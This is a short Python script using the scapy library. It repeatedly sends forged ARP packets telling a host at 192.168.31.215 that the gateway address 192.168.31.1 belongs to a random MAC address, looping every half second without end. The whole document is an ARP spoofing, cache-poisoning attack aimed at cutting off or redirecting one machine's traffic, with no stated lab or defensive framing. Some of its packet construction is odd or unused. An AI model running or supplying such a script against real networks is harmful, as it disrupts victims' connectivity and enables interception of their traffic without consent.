from scapy.all import *
import time

ether = Ether(src="00:00:00:00:00:00", dst="ff:ff:ff:ff:ff:ff")
arp = ARP(psrc="192.168.31.1", pdst="192.168.31.215", hwsrc=RandMAC())
ip = IP(src="192.168.31.1", dst="192.168.31.215")
icmp = ICMP()
# pkt = ether / arp
pkt = arp / ip
print(pkt.show())

while True:
    send(pkt)
    time.sleep(0.5)
